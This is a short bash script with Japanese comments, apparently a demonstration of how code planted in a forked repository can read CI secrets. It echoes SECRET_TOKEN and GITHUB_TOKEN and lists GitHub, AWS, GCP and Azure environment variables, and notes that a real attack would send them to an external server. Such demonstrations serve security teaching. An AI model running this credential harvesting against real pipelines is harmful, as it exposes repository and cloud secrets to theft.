#!/bin/bash
# 攻撃者がフォークリポジトリに仕込むスクリプト
# 実際の攻撃では外部サーバーに送信するが、今回は確認のため echo するだけ

echo "=== 攻撃者のコードが実行されています ==="
echo "SECRET_TOKEN の値: ${SECRET_TOKEN}"
echo "GITHUB_TOKEN の値: ${GITHUB_TOKEN}"
echo "その他の環境変数:"
env | grep -E "GITHUB_|AWS_|GCP_|AZURE_" || true
